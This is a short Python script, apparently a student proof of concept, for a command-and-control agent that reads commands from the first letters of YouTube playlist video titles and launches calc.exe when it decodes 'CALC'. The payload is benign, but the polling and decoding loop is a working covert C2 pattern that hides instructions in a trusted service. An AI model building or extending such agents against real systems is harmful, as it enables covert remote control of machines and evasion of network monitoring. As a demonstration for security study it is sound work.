# Project Cinema: YouTube C2 Agent
# Author: S.A. Nikam (Sandip University)

from googleapiclient.discovery import build
import time
import os

# --- PASTE YOUR KEYS HERE ---
API_KEY = 'PASTE_YOUR_AIza_KEY_HERE'
PLAYLIST_ID = 'PASTE_YOUR_PLAYLIST_ID_HERE'

def check_c2():
    try:
        # Connect to YouTube
        youtube = build('youtube', 'v3', developerKey=API_KEY)

        # Read the Playlist
        request = youtube.playlistItems().list(
            part="snippet",
            playlistId=PLAYLIST_ID,
            maxResults=10
        )
        response = request.execute()

        # Decode the Command
        command = ""
        print("\n[*] Reading Playlist Data:")
        for item in response['items']:
            title = item['snippet']['title']
            print(f"    -> Found: {title[:15]}... (Letter: {title[0]})") 
            command += title[0]
        
        return command.upper()

    except Exception as e:
        print(f"[!] Error: {e}")
        return None

# --- MAIN LOOP ---
print(f"[*] Agent Started by S.A. Nikam")
print(f"[*] Listening to Playlist...")

while True:
    cmd = check_c2()
    
    if cmd:
        print(f"[*] Decoded Signal: {cmd}")
        
        if "CALC" in cmd: 
            print("    >>> LAUNCHING CALCULATOR...")
            os.system("calc.exe") 
            break 
    
    print("[.] Waiting 10 seconds...")
    time.sleep(10)